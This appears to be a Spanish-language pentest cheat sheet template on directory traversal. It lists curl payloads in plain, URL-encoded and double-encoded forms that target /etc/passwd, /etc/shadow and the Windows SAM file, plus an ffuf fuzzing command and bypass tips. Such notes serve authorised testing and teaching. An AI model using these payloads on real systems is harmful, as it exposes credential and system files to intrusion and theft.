# CheatSheet: Directory Traversal

## Fecha: {FECHA}
## Host: {HOST}
## IP: {IP}

---

## Objetivo
Explorar y explotar vulnerabilidades de Directory Traversal para acceder 
a archivos y directorios sensibles fuera del directorio raíz permitido.

---
## Herramientas
1. Burp Suite

2. curl

3. Dirbuster
---
## Procedimiento y comandos
1. Paso 1: Identificar puntos de entrada: Examinar parámetros vulnerables en URLs o formularios:
	- **curl -X GET "http://{HOST}/vulnerable?file=../../../etc/passwd"**
2. Paso 2: Probar codificaciones comunes:
	- Codificación de URL (por ejemplo, %2e%2e%2f para ../):
	- **curl -X GET "http://{HOST}/vulnerable?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"**
	- Doble codificación:
	- **curl -X GET "http://{HOST}/vulnerable?file=%252e%252e%252fetc%252fpasswd"**
3. Comprobar diferentes sistemas operativos:

- Windows:

**curl -X GET "http://{HOST}/vulnerable?file=..\\..\\..\\Windows\\System32\\config\\SAM"**

- Linux:

**curl -X GET "http://{HOST}/vulnerable?file=../../../../../etc/shadow"**
4. Automatización: Usar herramientas como Burp Suite con secuencias de ataque en Intruder o fuzzers:

** ffuf -u http://{HOST}/vulnerable?file=FUZZ -w payloads.txt **
---
## Troubleshooting
- Si el servidor responde con un código de error HTTP 403, probar diferentes codificaciones o técnicas de bypass.

- Si los resultados están limitados por permisos, intentar escalar privilegios o probar en rutas públicas conocidas.

- Verificar logs del servidor (si es accesible) para encontrar pistas de restricciones o rutas filtradas.
---

## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripción breve (Comando)
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

